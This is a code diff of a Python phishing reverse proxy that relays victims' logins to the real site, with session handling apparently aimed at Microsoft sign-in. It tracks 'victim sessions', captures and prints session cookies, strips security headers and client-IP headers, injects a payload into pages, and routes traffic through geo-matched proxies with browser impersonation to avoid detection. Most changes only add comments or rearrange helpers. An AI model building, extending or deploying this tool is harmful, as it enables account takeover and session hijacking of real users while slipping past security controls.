@@ -7,7 +7,6 @@ import base64
 import random
 import string
 import threading
-import traceback
 from urllib.parse import urlparse, parse_qs, unquote, quote
 from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
 from io import BytesIO
@@ -120,6 +119,7 @@ def generate_random_string(length):
 # ==================== ENCRYPTION HELPERS ====================
 def encrypt_data(data_str):
     iv = os.urandom(16)
+    # AES-CTR using PyCryptodome (install: pip install pycryptodome)
     from Crypto.Cipher import AES
     from Crypto.Util import Counter
     ctr = Counter.new(128, initial_value=int.from_bytes(iv, byteorder='big'))
@@ -132,6 +132,7 @@ def encrypt_data(data_str):
 
 # ==================== COOKIE MANAGEMENT ====================
 def parse_cookie_date(cookie_date):
+    # Simplified: use email.utils.parsedate_to_datetime
     from email.utils import parsedate_to_datetime
     try:
         dt = parsedate_to_datetime(cookie_date)
@@ -184,7 +185,7 @@ def update_current_session_cookies(request_options, new_cookies, proxy_hostname,
     clock_skew = 0
     if proxy_response_date:
         parsed_date = parse_cookie_date(proxy_response_date)
-        if not (parsed_date != parsed_date):
+        if not (parsed_date != parsed_date):  # not NaN
             clock_skew = current_timestamp - parsed_date
 
     session = VICTIM_SESSIONS[current_session]
@@ -348,6 +349,7 @@ def update_html_proxy_response(decompressed_body):
     return (f"<head>{payload}</head>" + body_str).encode('utf-8')
 
 def update_federation_redirect_url(decompressed_body, proxy_hostname):
+    # For Microsoft-specific GetCredentialType response
     try:
         body_str = decompressed_body.decode('utf-8')
         body_obj = json.loads(body_str)
@@ -364,56 +366,39 @@ class ProxyHandler(BaseHTTPRequestHandler):
     protocol_version = "HTTP/1.1"
 
     def log_message(self, format, *args):
-        pass
+        pass  # suppress default logging
 
     def _send_file(self, filename, content_type="text/html"):
         path = os.path.join(os.path.dirname(os.path.abspath(__file__)), filename)
         if not os.path.exists(path):
             self.send_error(404)
             return
-        with open(path, "rb") as f:
-            file_data = f.read()
         self.send_response(200)
         self.send_header("Content-Type", content_type)
-        self.send_header("Content-Length", str(len(file_data)))
         self.end_headers()
-        self.wfile.write(file_data)
+        with open(path, "rb") as f:
+            self.wfile.write(f.read())
 
     def _send_redirect(self, location):
         self.send_response(301)
         self.send_header("Location", location)
-        self.send_header("Content-Length", "0")
         self.end_headers()
-
-    def _send_json(self, data):
-        body = json.dumps(data).encode()
-        self.send_response(200)
-        self.send_header("Content-Type", "application/json")
-        self.send_header("Content-Length", str(len(body)))
-        self.end_headers()
-        self.wfile.write(body)
 
     def do_GET(self):
-        try:
-            self._handle_request()
-        except Exception:
-            traceback.print_exc()
-            self.send_error(500)
+        self._handle_request()
 
     def do_POST(self):
-        try:
-            self._handle_request()
-        except Exception:
-            traceback.print_exc()
-            self.send_error(500)
+        self._handle_request()
 
     def _handle_request(self):
         url = self.path
         headers = self.headers
         method = self.command
 
+        # Determine current session from cookie
         current_session = self._get_user_session(headers.get("Cookie"))
 
+        # --- Phishing URL entry point ---
         if url.startswith(PROXY_ENTRY_POINT) and PHISHED_URL_PARAMETER in url:
             try:
                 match = PHISHED_URL_REGEXP.search(url)
@@ -436,9 +421,11 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 VICTIM_SESSIONS[session]["port"] = phished_url.port
                 VICTIM_SESSIONS[session]["host"] = phished_url.netloc
 
+                # Initialize proxy state if not already
                 if "victimIP" not in VICTIM_SESSIONS[session]:
                     victim_ip = get_client_ip(self)
                     VICTIM_SESSIONS[session]["victimIP"] = victim_ip
+                    # Do async geo lookup; we'll start a thread and store result later
                     threading.Thread(target=self._fetch_geo_and_proxy, args=(session, victim_ip), daemon=True).start()
 
                 self._send_file(PROXY_FILES["index"])
@@ -447,10 +434,12 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 self._send_file(PROXY_FILES["notFound"])
                 return
 
+        # --- Service worker file ---
         if url == PROXY_PATHNAMES["serviceWorker"]:
             self._send_file(PROXY_PATHNAMES["serviceWorker"].lstrip("/"), "text/javascript")
             return
 
+        # --- Favicon redirect ---
         if url == PROXY_PATHNAMES["favicon"]:
             if current_session and current_session in VICTIM_SESSIONS:
                 sess = VICTIM_SESSIONS[current_session]
@@ -459,11 +448,13 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 self._send_redirect(REDIRECT_URL)
             return
 
+        # --- Proxy endpoint (used by service worker) ---
         if current_session or url == PROXY_PATHNAMES["proxy"]:
             content_length = int(headers.get("Content-Length", 0))
             body = self.rfile.read(content_length) if content_length else b""
 
             if not current_session:
+                # New session via proxy endpoint (service worker sends JSON with url)
                 if body:
                     try:
                         data = json.loads(body.decode())
@@ -490,6 +481,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
                     self._send_redirect(REDIRECT_URL)
                     return
 
+            # ---- Existing session, process proxy request ----
             sess = VICTIM_SESSIONS[current_session]
             proxy_request_protocol = sess["protocol"]
             proxy_request_options = {
@@ -502,12 +494,14 @@ class ProxyHandler(BaseHTTPRequestHandler):
             is_navigation_request = False
 
             if body:
+                # Handle jsCookie endpoint
                 if url == PROXY_PATHNAMES["jsCookie"]:
                     update_current_session_cookies(proxy_request_options, [body.decode()], headers.get("Host"), current_session)
                     valid_domains = get_valid_domains([headers.get("Host"), sess["hostname"]])
                     self._send_json(valid_domains)
                     return
 
+                # Handle proxy endpoint JSON
                 if url == PROXY_PATHNAMES["proxy"]:
                     try:
                         data = json.loads(body.decode())
@@ -516,6 +510,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
 
                         if proxy_url.hostname == headers.get("Host"):
                             if proxy_path.startswith(PROXY_ENTRY_POINT) and PHISHED_URL_PARAMETER in proxy_path:
+                                # Update target URL
                                 match = PHISHED_URL_REGEXP.search(proxy_path)
                                 phished_url_str = unquote(match.group(0))
                                 phished_url = urlparse(phished_url_str)
@@ -550,6 +545,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
                                 self._send_json(valid_domains)
                                 return
                         else:
+                            # Direct request to target domain
                             proxy_request_protocol = proxy_url.scheme + ":"
                             proxy_request_options["path"] = proxy_path
                             proxy_request_options["port"] = proxy_url.port
@@ -565,6 +561,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
                         self._send_file(PROXY_FILES["notFound"])
                         return
 
+            # Prepare request body
             request_body = None
             if body:
                 try:
@@ -573,8 +570,10 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 except:
                     request_body = body.decode() if body else None
 
+            # Update proxy request headers (cookies, origin, referer, remove azure headers)
             self._update_proxy_request_headers(proxy_request_options, current_session, headers.get("Host"))
 
+            # Remove content-length/type if no body
             if not request_body:
                 proxy_request_options["headers"].pop("Content-Type", None)
                 proxy_request_options["headers"].pop("Content-Length", None)
@@ -586,12 +585,15 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 sess["port"] = proxy_request_options["port"]
                 sess["host"] = proxy_request_options["headers"]["Host"]
 
+            # Forward request to target using curl_cffi with proxy and impersonation
             self._forward_request(proxy_request_protocol, proxy_request_options, current_session, headers.get("Host"),
                                   request_body, is_navigation_request)
             return
 
+        # Default: redirect to REDIRECT_URL
         self._send_redirect(REDIRECT_URL)
 
+    # Helper methods
     def _create_session(self, session_name, cookie_value, phished_url):
         VICTIM_SESSIONS[session_name] = {
             "value": cookie_value,
@@ -627,12 +629,15 @@ class ProxyHandler(BaseHTTPRequestHandler):
             sess["proxyLevels"] = []
             pool = get_session_pool()
             if geo:
+                # city level
                 for s in pool:
                     sess["proxyLevels"].append({"url": build_proxy_url(geo, s), "level": "city"})
+                # region
                 geo_no_city = geo.copy()
                 geo_no_city["city"] = None
                 for s in pool:
                     sess["proxyLevels"].append({"url": build_proxy_url(geo_no_city, s), "level": "region"})
+                # country
                 geo_country = geo.copy()
                 geo_country["region"] = None
                 geo_country["city"] = None
@@ -651,17 +656,21 @@ class ProxyHandler(BaseHTTPRequestHandler):
             "x-client-ip", "x-client-port"
         ]
         headers = proxy_request_options["headers"]
+        # Cookies
         cookie_str = prepare_proxy_request_cookies(proxy_request_options, current_session)
         if cookie_str:
             headers["Cookie"] = cookie_str
         else:
             headers.pop("Cookie", None)
 
+        # Origin
         sess = VICTIM_SESSIONS[current_session]
         if headers.get("Origin"):
             headers["Origin"] = f"{sess['protocol']}//{sess['host']}"
+        # Referer
         if headers.get("Referer") and (not headers["Referer"] or PROXY_ENTRY_POINT in headers["Referer"]):
             headers.pop("Referer", None)
+        # Remove Azure-specific headers and replace hostname
         for key in list(headers.keys()):
             if key.lower() in azure_headers:
                 headers.pop(key, None)
@@ -675,6 +684,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
             return
 
         sess = VICTIM_SESSIONS[current_session]
+        # Determine proxy agent (use first proxyLevels entry, fallback)
         proxy_url = None
         if "proxyAgent" not in sess:
             if sess.get("proxyLevels"):
@@ -683,6 +693,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 print(f"🌍 Using proxy ({first['level']}): {proxy_url}")
                 sess["proxyAgent"] = proxy_url
             else:
+                # Fallback global proxy
                 proxy_url = build_proxy_url(None, generate_random_string(8))
                 print(f"🌍 Using fallback global proxy: {proxy_url}")
                 sess["proxyAgent"] = proxy_url
@@ -692,6 +703,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
         proxies = {"http": proxy_url, "https": proxy_url}
         headers = proxy_request_options["headers"]
 
+        # Remove hop-by-hop headers
         for h in ["Connection", "Keep-Alive", "Proxy-Authenticate", "Proxy-Authorization", "TE", "Trailers", "Transfer-Encoding", "Upgrade"]:
             headers.pop(h, None)
 
@@ -707,7 +719,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
                 proxies=proxies,
                 impersonate="chrome",
                 timeout=30,
-                allow_redirects=False
+                allow_redirects=False  # we handle redirects manually
             )
             self._handle_proxy_response(resp, proxy_request_options, current_session, proxy_hostname,
                                         request_body, is_navigation_request)
@@ -719,15 +731,18 @@ class ProxyHandler(BaseHTTPRequestHandler):
                                request_body, is_navigation_request):
         sess = VICTIM_SESSIONS[current_session]
 
+        # Process Set-Cookie headers
         set_cookie_headers = resp.headers.get_all("set-cookie") if hasattr(resp.headers, 'get_all') else [resp.headers.get("set-cookie")]
         set_cookie_headers = [c for c in set_cookie_headers if c]
         if set_cookie_headers:
             update_current_session_cookies(proxy_request_options, set_cookie_headers, proxy_hostname,
                                            current_session, resp.headers.get("date"))
+            # Print cookies to console (debug)
             print(f"[COOKIES] Session: {current_session}")
             for cookie in sess["cookies"]:
                 print(f"  {cookie['name']}={cookie['value']} (domain={cookie['domain']}, path={cookie['path']})")
 
+        # Handle redirects for navigation
         if is_navigation_request and resp.status_code in (300, 301, 302, 303, 307, 308) and resp.headers.get("location"):
             location = resp.headers["location"]
             try:
@@ -744,6 +759,7 @@ class ProxyHandler(BaseHTTPRequestHandler):
             except:
                 sess["path"] = location
 
+        # Delete security headers from response
         security_headers = [
             "x-frame-options", "x-xss-protection", "x-content-type-options", "set-cookie",
             "content-security-policy", "content-security-policy-report-only",
@@ -754,9 +770,11 @@ class ProxyHandler(BaseHTTPRequestHandler):
             if h in resp.headers:
                 del resp.headers[h]
 
+        # Set cache-control and CORS
         resp.headers["cache-control"] = "no-store"
         resp.headers["access-control-allow-origin"] = f"https://{proxy_hostname}"
 
+        # Prepare response body
         body = resp.content
         if resp.headers.get("content-type") and "text/html" in resp.headers["content-type"] and body:
             content_encoding = resp.headers.get("content-encoding")
@@ -773,12 +791,19 @@ class ProxyHandler(BaseHTTPRequestHandler):
             if "content-length" in resp.headers:
                 resp.headers["content-length"] = str(len(body))
 
+        # Send response to victim
         self.send_response(resp.status_code)
         for key, value in resp.headers.items():
             if key.lower() not in ["transfer-encoding", "connection"]:
                 self.send_header(key, value)
         self.end_headers()
         self.wfile.write(body)
+
+    def _send_json(self, data):
+        self.send_response(200)
+        self.send_header("Content-Type", "application/json")
+        self.end_headers()
+        self.wfile.write(json.dumps(data).encode())
 
 def run_server(port=3000):
     server = ThreadingHTTPServer(("0.0.0.0", port), ProxyHandler)
